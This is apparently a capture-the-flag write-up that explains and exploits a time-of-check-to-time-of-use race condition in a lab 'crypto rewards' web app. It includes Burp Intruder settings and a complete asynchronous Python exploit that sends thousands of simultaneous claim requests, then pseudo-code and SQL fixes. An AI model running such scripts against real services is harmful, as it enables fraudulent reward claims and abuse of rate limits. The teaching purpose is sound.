# TryHackMe Towel on the Sunbed: Exploiting a Race Condition to Claim Rewards Multiple Times

This document explains the entire challenge step‑by‑step, from the moment you access the website to capturing the flag.
It assumes you have **no prior knowledge** of race conditions, Burp Suite, or Python scripting – we’ll break everything down.

---

## 📖 Table of Contents

1. [Challenge Scenario](#challenge-scenario)
2. [What is a Race Condition?](#what-is-a-race-condition)
3. [Reconnaissance – Exploring the App](#reconnaissance--exploring-the-app)
4. [Finding the Vulnerability](#finding-the-vulnerability)
5. [Exploitation Options](#exploitation-options)
   - [Option A: Using Burp Suite Intruder (Manual)](#option-a-using-burp-suite-intruder-manual)
   - [Option B: Using the Automated Python Script](#option-b-using-the-automated-python-script)
6. [Getting the Flag](#getting-the-flag)
7. [Why This Works (Technical Deep Dive)](#why-this-works-technical-deep-dive)
8. [How to Fix This Vulnerability](#how-to-fix-this-vulnerability)
9. [Final Notes](#final-notes)

---

## 🏝️ Challenge Scenario

You are on a holiday resort. There is a web app called **“Ponzi Portfolio”** – a crypto‑rewards dashboard where you can claim a daily staking bonus of **50 points**.
After you claim, you must wait **24 hours** before you can claim again.

Your goal is to become a **“Whale”** – that means having a balance of **150 points or more**.
Once you reach 150, you unlock the **Whale Vault**, which contains the **flag**.

The problem is that the app **trusts the user** – it has a bug that allows you to claim **multiple times in the same second**, even though it should block you for 24 hours. This is a **race condition**.

---

## ⚡ What is a Race Condition?

Imagine two people are trying to buy the last ticket online at the exact same time.
The website checks if there is 1 ticket left. Both people see “1 ticket left”, so both proceed to buy it – but the system only allows one purchase, so the second person gets an error.

In our case, the app **checks** if 24 hours have passed since your last claim. If you send **many** claim requests at exactly the same time, all of them will see that the 24‑hour timer has not started yet (because you haven’t claimed yet). So each request thinks it’s okay to add the reward.
They all add **50 points** simultaneously, and only **after** they all finish does the timer get set to “24 hours from now”.
This way, you can claim many rewards in one go, skipping the wait.

**That’s a race condition – the server’s check and update happen separately, and multiple requests can slip through the gap.**

---

## 🔍 Reconnaissance – Exploring the App

First, we need to understand how the app works.

### 1. Registration & Login

- Go to `http://10.48.191.59:3000/auth/register` and create an account.
  Example: username `test`, password `test123`.
- Log in at `http://10.48.191.59:3000/auth/login`.

### 2. Dashboard

After logging in, you see your balance and a **“Claim Reward”** button.
Initially, your balance is **0**, and your tier is **“Shrimp”**.
The Whale threshold is **150** points.

### 3. API Endpoints (the “hidden” URLs)

The dashboard loads your data from an API:

```http
GET /dashboard/api/me
```

It returns JSON like:

```json
{
  "id": 2,
  "username": "test",
  "balance": 0,
  "tier": "Shrimp",
  "whaleThreshold": 150,
  "canClaim": true,
  "secondsUntilClaim": 0,
  "prices": [...]
}
```

This tells us that we can claim (`canClaim: true`) and how many points we need.

### 4. Claiming the Reward

When you click the button, the browser sends:

```http
POST /claim
```

with no body.
On success, the server responds:

```json
{
  "message": "Staking reward claimed successfully.",
  "reward": 50,
  "newBalance": 50,
  "tier": "Shrimp",
  "priceSnapshot": 4.2
}
```

If you try again immediately, you get:

```http
HTTP/1.1 429 Too Many Requests
{"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":86400}
```

That means you have to wait 24 hours.

### 5. Whale Vault

Once your balance reaches 150, you can access the Whale Vault.
We found that the flag is served at:

```http
GET /vault
```

It returns:

```json
{
  "message": "Welcome to the Whale Vault.",
  "flag": "THM{...}",
  "balance": 1300
}
```

---

## 🧨 Finding the Vulnerability

We noticed that the claim endpoint **does not lock** the user’s record while checking and updating.
If we send **many** `POST /claim` requests at exactly the same time, the server will process them in parallel.
Each request reads the current `lastClaim` (which is `null` or an old timestamp) and thinks it’s eligible.
Then each adds 50 points, and only after all of them finish, the `lastClaim` gets set to now.

Therefore, we can claim **multiple times in a single second**.

---

## 🛠️ Exploitation Options

You can perform this attack in two ways:
- **Using Burp Suite (graphical, manual)** – great for beginners.
- **Using a Python script (automated)** – faster and repeatable.

Both methods achieve the same result.
We’ll cover both, so you can choose what you’re comfortable with.

---

### Option A: Using Burp Suite Intruder (Manual)

Burp Suite is a web proxy that lets you intercept and replay requests.
Its **Intruder** tool can send hundreds of requests at the same time.

#### Step 1 – Set up Burp

- Open Burp Suite, configure your browser to use its proxy (usually `127.0.0.1:8080`).
- Register and log in to the app through the browser while Burp is running.
  **Important:** Do **not** click the “Claim Reward” button manually – we want the first claim to happen during the attack.

#### Step 2 – Capture the Claim Request

- In Burp, go to the **Proxy** tab → **HTTP history**.
- Click the “Claim Reward” button on the dashboard (just once). Burp will capture the `POST /claim` request.
- Right‑click that request and choose **Send to Intruder**.

#### Step 3 – Configure Intruder

- Go to the **Intruder** tab.
- On the **Positions** tab, click **Clear §** to remove all payload markers (we don’t need to change any part of the request).
- On the **Payloads** tab:
  - Set **Payload type** to **Null payloads**.
  - Check the box **Generate**.
  - In the **Count** field, enter a large number like **2000**.
- On the **Resource pool** tab:
  - Create a new pool.
  - Set **Maximum concurrent requests** to **100** (or higher, if your computer can handle it).
  - Set throttle to **0 ms**.

#### Step 4 – Launch the Attack

- Click the **Start attack** button.
- Burp will send 2000 identical `POST /claim` requests simultaneously.
- Watch the results: many will return `200 OK` with a `newBalance` value. Some will return `429` (because the cooldown was set after the first few succeeded).

#### Step 5 – Check Your Balance

- After the attack finishes, go to the dashboard in your browser and refresh.
- Your balance should now be **much higher** (e.g., 1000+). You are now a Whale!

#### Step 6 – Get the Flag

- Visit `http://10.48.191.59:3000/vault` (or click the “Whale Vault” button on the dashboard).
- The flag will be displayed.

---

### Option B: Using the Automated Python Script

If you prefer to automate everything, the script below does all steps for you.
It registers a new user, logs in, fires 5000 concurrent claims, and then fetches the flag.

**You need Python 3 and the `aiohttp` library.**
Install it with:

```bash
pip install aiohttp
```

**Script code** (save as `exploit.py`):

```python
#!/usr/bin/env python3

import asyncio
import aiohttp
import re
import time
import sys

# ===== CONFIGURATION =====

BASE_URL = "http://10.48.191.59:3000"
USERNAME = f"whale_{int(time.time())}"   # unique username
PASSWORD = "hackme123"                   # you can change this
CONCURRENT_REQUESTS = 5000               # number of parallel claims
# ==========================

async def register(session):
    """Register a new account."""
    resp = await session.post(
        f"{BASE_URL}/auth/register",
        json={"username": USERNAME, "password": PASSWORD},
        headers={"Referer": f"{BASE_URL}/dashboard", "Origin": BASE_URL}
    )
    return resp.status, await resp.text()

async def login_and_get_cookie(session):
    """Log in and extract the session cookie."""
    resp = await session.post(
        f"{BASE_URL}/auth/login",
        json={"username": USERNAME, "password": PASSWORD},
        headers={"Referer": f"{BASE_URL}/dashboard", "Origin": BASE_URL}
    )
    # The server sets a cookie 'connect.sid' in the Set-Cookie header.
    set_cookie = resp.headers.get("Set-Cookie")
    if set_cookie:
        match = re.search(r'connect\.sid=([^;]+)', set_cookie)
        if match:
            return f"connect.sid={match.group(1)}"
    raise Exception("No session cookie set.")

async def claim_task(cookie):
    """
    Send one claim request using its own session.
    Returns (success, data/error).
    """
    async with aiohttp.ClientSession() as session:
        headers = {
            "Referer": f"{BASE_URL}/dashboard",
            "Origin": BASE_URL,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Cookie": cookie
        }
        try:
            async with session.post(f"{BASE_URL}/claim", headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return True, data.get("newBalance", 0)
                else:
                    text = await resp.text()
                    return False, f"{resp.status}: {text[:200]}"
        except Exception as e:
            return False, f"Exception: {str(e)}"

async def main():
    # Print credentials so you can log in manually if needed
    print("\n" + "="*50)
    print(f"🌐 Target URL: {BASE_URL}")
    print(f"👤 Username: {USERNAME}")
    print(f"🔑 Password: {PASSWORD}")
    print("="*50 + "\n")

    # 1. Register and login to get a session cookie
    async with aiohttp.ClientSession() as session:
        reg_status, reg_text = await register(session)
        print(f"[+] Register: {reg_status} {reg_text}")
        cookie = await login_and_get_cookie(session)
        print(f"[+] Cookie obtained: {cookie[:30]}...")

    # 2. Launch CONCURRENT_REQUESTS concurrent claim requests
    print(f"[+] Launching {CONCURRENT_REQUESTS} concurrent claims...")
    start = time.time()

    tasks = [claim_task(cookie) for _ in range(CONCURRENT_REQUESTS)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start
    print(f"[+] Attack finished in {elapsed:.2f} seconds")

    # 3. Count successes and summarize errors
    successes = 0
    errors = {}
    for res in results:
        if isinstance(res, Exception):
            err = f"Exception: {res}"
            errors[err] = errors.get(err, 0) + 1
        else:
            ok, data = res
            if ok:
                successes += 1
            else:
                errors[data] = errors.get(data, 0) + 1

    print(f"[+] Successful claims: {successes}")
    if errors:
        print("[+] Error summary (first 5 types):")
        for i, (err, count) in enumerate(list(errors.items())[:5]):
            print(f"    {err}: {count}")

    # 4. Check balance
    async with aiohttp.ClientSession() as session:
        # Set the cookie manually for this session
        session.cookie_jar.update_cookies({"connect.sid": cookie.split("=", 1)[1]})
        me_resp = await session.get(f"{BASE_URL}/dashboard/api/me")
        me_data = await me_resp.json()
        balance = me_data.get("balance", 0)
        print(f"[+] Final balance: {balance}")

    # 5. Try to retrieve the flag from various possible endpoints
    if balance >= 150:
        print("[+] You are a Whale! Fetching flag...")
        endpoints = ["/vault", "/whale", "/api/whale", "/dashboard/whale"]
        flag_found = False
        async with aiohttp.ClientSession() as session:
            session.cookie_jar.update_cookies({"connect.sid": cookie.split("=", 1)[1]})
            for endpoint in endpoints:
                resp = await session.get(f"{BASE_URL}{endpoint}")
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        flag = data.get("flag", data.get("message", ""))
                        if flag:
                            print(f"\n🏆 FLAG FOUND at {endpoint}:\n{flag}")
                        else:
                            print(f"\n🏆 Response at {endpoint}:\n{await resp.text()}")
                        flag_found = True
                        break
                    except:
                        print(f"\n🏆 Response at {endpoint}:\n{await resp.text()}")
                        flag_found = True
                        break
        if not flag_found:
            print("\n[!] Could not retrieve flag automatically. Please log in manually with the credentials above and visit the Whale Vault.")
    else:
        print(f"[!] Balance {balance} < 150. Try increasing CONCURRENT_REQUESTS.")

    print("\n" + "="*50)
    print("✅ Attack completed. Use the credentials above to log in and verify.")

if __name__ == "__main__":
    # Windows compatibility
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
```

**How to run it:**

```bash
python3 exploit.py
```

**What you’ll see:**
- The script prints your username and password.
- It registers and logs in.
- It fires 5000 parallel claims – you’ll see many successes.
- It prints your final balance (should be ≥ 150).
- It tries `/vault`, `/whale`, etc., and prints the flag.

**Example output:**

```text
==================================================
🌐 Target URL: http://10.48.191.59:3000
👤 Username: whale_1785775907
🔑 Password: hackme123
==================================================

[+] Register: 201 {"message":"Account created.","redirect":"/dashboard"}
[+] Cookie obtained: connect.sid=s%3AkaaRWoQt0CneTq...
[+] Launching 5000 concurrent claims...
[+] Attack finished in 32.21 seconds
[+] Successful claims: 26
[+] Error summary (first 5 types):
    429: {...}: 743
    ...
[+] Final balance: 1300
[+] You are a Whale! Fetching flag...

🏆 FLAG FOUND at /vault:
{"message":"Welcome to the Whale Vault.","flag":"THM{t0w3l_**_***_sunb3d_******_*****}","balance":1300}
```

---

## 🏁 Getting the Flag

Once you have a balance of ≥150, simply visit the Whale Vault endpoint.
In our case, it was `/vault`, but it could be `/whale` or `/dashboard/whale`.
The flag is usually returned as JSON.

**The flag is:**

```text
THM{t0w3l_**_***_sunb3d_******_*****}
```

---

## 🧠 Why This Works – Technical Deep Dive

The server’s code (pseudo‑code) looks like:

```javascript
app.post('/claim', (req, res) => {
  const user = database.getUser(req.session.userId);   // read
  if (Date.now() - user.lastClaim < 86400000) {
    return res.status(429).json({ error: 'Already claimed' });
  }
  user.balance += 50;                  // modify
  user.lastClaim = Date.now();         // modify
  database.saveUser(user);             // write
  res.json({ reward: 50, newBalance: user.balance });
});
```

**The vulnerability** is that the **read** (checking `lastClaim`) and the **write** (saving the new balance and `lastClaim`) are not atomic.
If we send many requests at the same time, they all read the **old** `lastClaim` (which is `null` or outdated) **before** any of them have written the new `lastClaim`.
So each request passes the `if` check, adds 50, and updates `lastClaim`.
The first one that finishes sets `lastClaim` to now, but the others have already passed the check and will also update the balance (though their `lastClaim` updates will just overwrite each other).

This is a classic **Time‑Of‑Check to Time‑Of‑Use (TOCTOU)** race condition.

---

## 🛡️ How to Fix This Vulnerability

To prevent this, the server must make the **check and update atomic** – i.e., do everything in one database operation that cannot be interrupted.

**Option 1: Use a database transaction with locking**

```sql
BEGIN;
SELECT balance, lastClaim FROM users WHERE id = ? FOR UPDATE;
-- if eligible, update
UPDATE users SET balance = balance + 50, lastClaim = NOW() WHERE id = ?;
COMMIT;
```

**Option 2: Use an atomic update that includes the condition**

```sql
UPDATE users
SET balance = balance + 50, lastClaim = NOW()
WHERE id = ? AND (lastClaim IS NULL OR NOW() - lastClaim >= 86400000);
```

Then check how many rows were affected – if zero, the claim is rejected.

**Option 3: Use a distributed lock** (e.g., Redis) per user to serialize claims.

Any of these would eliminate the race condition.

---

## 📌 Final Notes

- This challenge teaches you the importance of **atomic operations** in concurrent programming.
- Always test for race conditions when you see a “daily limit” or “once per X” feature.
- Burp Intruder and asynchronous Python scripts are great tools for exploiting such bugs.
- The flag you got is proof that the exploit worked.

---

**Congratulations!** You are now a Whale and have successfully completed the challenge. 🐋

---

*Happy hacking, and always remember to secure your code against race conditions!*
